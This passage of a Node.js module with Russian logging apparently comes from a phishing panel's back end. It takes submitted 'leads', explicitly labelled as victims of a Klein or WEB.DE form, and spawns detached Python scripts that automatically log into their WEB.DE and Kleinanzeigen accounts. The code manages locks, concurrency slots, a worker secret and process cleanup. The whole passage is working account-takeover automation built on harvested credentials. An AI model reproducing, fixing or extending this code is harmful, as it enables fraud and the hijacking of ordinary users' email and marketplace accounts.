        detail: 'слоты ' + runningWebdeLoginLeadIds.size + '/' + WEBDE_LOGIN_MAX_CONCURRENT
      });
      d.persistLeadPatch(leadId, { eventTerminal: leadKq.eventTerminal });
    }
    return;
  }
  const leads = d.readLeads();
  const lead = leads.find(function (l) { return l.id === leadId; });
  if (!lead) {
    d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', '—', 'пропуск Klein: лид не найден, leadId=' + leadId, leadId);
    return;
  }
  if (leadIsWorkedLikeAdmin(lead)) {
    const emW = String(lead.emailKl || lead.email || '').trim() || '—';
    d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', emW, 'пропуск Klein: лог отработан · leadId=' + leadId, leadId);
    return;
  }
  if (!leadSubmittedAsKleinVictim(lead)) {
    d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', '—', 'пропуск Klein: нет brand/clientFormBrand klein, leadId=' + leadId, leadId);
    return;
  }
  const lockEmail = String(lead.emailKl || lead.email || '').trim().toLowerCase();
  if (!lockEmail) {
    d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', '—', 'пропуск Klein: нет emailKl/email, leadId=' + leadId, leadId);
    return;
  }
  if (lead.status === 'show_success' && !forceRestart) {
    d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', lockEmail, 'пропуск Klein: лид уже Успех без forceRestart, leadId=' + leadId, leadId);
    return;
  }
  if (!forceRestart && isLeadAutomationAlreadyRunning(leadId)) {
    logDuplicateAutomationAttempt(leadId, lockEmail, 'Klein: активный процесс / слот / lock по leadId');
    return;
  }
  preemptWebdeLoginForReplacedLead(leadId, lockEmail);
  if (!tryAcquireLeadAutomationLock(leadId)) {
    logDuplicateAutomationAttempt(leadId, lockEmail, 'Klein: lock leadId занят (atomic)');
    return;
  }
  if (!tryAcquireWebdeScriptLock(lockEmail, leadId)) {
    clearLeadAutomationLock(leadId);
    d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', lockEmail, 'пропуск Klein: lock занят, leadId=' + leadId, leadId);
    return;
  }
  const loginDir = path.join(d.serverProjectRoot, 'login');
  const scriptPath = path.join(loginDir, 'klein_simulation_api.py');
  if (!fs.existsSync(scriptPath)) {
    console.error('[AUTO-LOGIN] Klein: не найден скрипт ' + scriptPath);
    clearLeadAutomationLock(leadId);
    clearWebdeScriptRunning(lockEmail);
    return;
  }
  const kleinComboSlot = runningWebdeLoginLeadIds.size;
  runningWebdeLoginLeadIds.add(leadId);
  const baseUrl = process.env.SERVER_URL || ('http://127.0.0.1:' + (parseInt(process.env.PORT, 10) || 3000));
  const workerSecret = d.getWorkerSecret() || '';
  const kleinRunSession = beginWebdeAutoLoginRun(lead);
  const klDom = lockEmail.indexOf('@') >= 0 ? lockEmail.slice(lockEmail.indexOf('@')) : '';
  const klStartDetail = 'klein_simulation_api.py · слот ' + kleinComboSlot + '/' + WEBDE_LOGIN_MAX_CONCURRENT + ' · …' + klDom;
  d.pushEvent(lead, d.EVENT_LABELS.KLEIN_START, 'script', { session: kleinRunSession, detail: klStartDetail });
  d.persistLeadPatch(leadId, {
    webdeScriptRunSeq: lead.webdeScriptRunSeq,
    webdeScriptActiveRun: lead.webdeScriptActiveRun,
    eventTerminal: lead.eventTerminal
  });
  d.logTerminalFlow('AUTO-LOGIN', 'Klein', kleinRunSession, lockEmail, 'запуск klein_simulation_api.py leadId=' + leadId + ' активных ' + runningWebdeLoginLeadIds.size + '/' + WEBDE_LOGIN_MAX_CONCURRENT, leadId);
  const projectRoot = d.serverProjectRoot;
  const python = resolvePythonExecutable(projectRoot);
  const env = makePythonSpawnEnv(projectRoot);
  const child = spawn(python, [scriptPath, '--server-url', baseUrl, '--lead-id', leadId], {
    cwd: d.serverProjectRoot,
    detached: true,
    stdio: 'inherit',
    env: Object.assign({}, env, { WORKER_SECRET: workerSecret })
  });
  webdeLockWriteChildPid(lockEmail, child.pid);
  webdeLeadLockWritePid(leadId, child.pid);
  webdeLoginChildByLeadId.set(leadId, child);
  registerAutomationChild(child);
  var cleaned = false;
  function cleanupChild(reason, errObj) {
    if (cleaned) return;
    cleaned = true;
    unregisterAutomationChild(child);
    webdeLoginChildByLeadId.delete(leadId);
    clearLeadAutomationLock(leadId);
    releaseWebdeLoginSlot(leadId);
    clearWebdeScriptRunning(lockEmail);
    try {
      const live = d.readLeadById(leadId);
      if (live && live.webdeScriptActiveRun != null && live.webdeScriptActiveRun !== '') {
        endWebdeAutoLoginRun(live);
        d.persistLeadPatch(leadId, { webdeScriptActiveRun: null });
      }
    } catch (_) {}
    if (reason === 'exit' && errObj && Number.isFinite(errObj.code) && errObj.code !== 0) {
      try {
        d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', lockEmail, 'Скрипт завершился с ошибкой (code=' + errObj.code + '), leadId=' + leadId, leadId);
      } catch (_) {}
    }
    if (reason === 'error') {
      try {
        const msg = errObj && errObj.message ? String(errObj.message) : String(errObj || 'spawn_error');
        d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', lockEmail, 'ошибка запуска Klein Python: ' + msg + ', leadId=' + leadId, leadId);
      } catch (_) {}
    }
  }
  child.on('exit', function (code, signal) { cleanupChild('exit', { code: code, signal: signal }); });
  child.on('error', function (err) { cleanupChild('error', err); });
  child.unref();
}

function killAllSpawnedAutomationChildrenSync() {
  try {
    activeAutomationChildren.forEach(function (c) {
      if (c && typeof c.kill === 'function') {
        try { c.kill('SIGKILL'); } catch (_) {}
      }
    });
    activeAutomationChildren.clear();
    webdeLoginChildByLeadId.forEach(function (c) {
      if (c && typeof c.kill === 'function') {
        try {
          c.kill('SIGKILL');
        } catch (_) {}
      }
    });
  } catch (_) {}
}

(function registerAutomationProcessExitHook() {
  process.on('exit', killAllSpawnedAutomationChildrenSync);
})();

/**
 * PM2 / systemd шлют SIGTERM; Ctrl+C — SIGINT.
 * Сначала убиваем отсоединённые Python (detached), затем даём сработать server.js → shutdown() → server.close → process.exit(0).
 * Не вызываем здесь process.exit(0), иначе оборвётся graceful close HTTP и SQLite.
 */
(function registerAutomationSignalHandlers() {
  function onSignal(sig) {
    try {
      console.log('[AUTO-LOGIN] ' + sig + ': завершение дочерних Python (SIGKILL)…');
      killAllSpawnedAutomationChildrenSync();
    } catch (_) {}
  }
  process.on('SIGTERM', function () {
    onSignal('SIGTERM');
  });
  process.on('SIGINT', function () {
    onSignal('SIGINT');
  });
})();

module.exports = {
  init,
  WEBDE_LOGIN_MAX_CONCURRENT,
  WEBDE_SCRIPT_MAX_AGE_MS,
  runningWebdeLoginLeadIds,
  pendingWebdeLoginQueue,
  webdeLoginChildByLeadId,
  runWhenLeadsWriteQueueIdle,
  tryAcquireWebdeScriptLock,
  clearWebdeScriptRunning,
  touchWebdeScriptLock,
  webdeLockWriteChildPid,
  webdeLockKillChildIfAny,
  webdeLockPath,
  beginWebdeAutoLoginRun,
  endWebdeAutoLoginRun,
  setWebdeLeadScriptStatus,
  releaseWebdeLoginSlot,
  preemptWebdeLoginForReplacedLead,
  stopWebdeLoginForDeletedLead,
  clearAllWebdeChildrenAndQueues,
  startWebdeLoginAfterLeadSubmit,
  restartWebdeAutoLoginAfterVictimRetryFromError,
  startWebdeLoginForLeadId,
  startKleinLoginForLeadId,
  isLeadAutomationAlreadyRunning,
  killAllSpawnedAutomationChildrenSync,
  resolvePythonExecutable,
  makePythonSpawnEnv,
  webdeScriptProxyEnv,
};
